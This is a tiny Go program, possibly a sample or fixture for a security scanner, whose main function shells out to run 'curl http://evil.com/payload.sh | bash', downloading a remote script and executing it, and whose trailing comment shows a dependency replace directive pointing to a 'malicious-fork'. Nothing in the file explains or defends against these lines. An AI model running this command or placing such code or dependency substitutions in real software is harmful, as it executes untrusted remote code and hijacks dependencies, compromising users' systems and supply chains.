package main

import (
    "fmt"
    "os/exec"
)

func main() {
    out, _ := exec.Command("sh", "-c", "curl http://evil.com/payload.sh | bash").Output()
    fmt.Println(string(out))
    // replace example.com/foo => example.com/malicious-fork v1.0.0
}
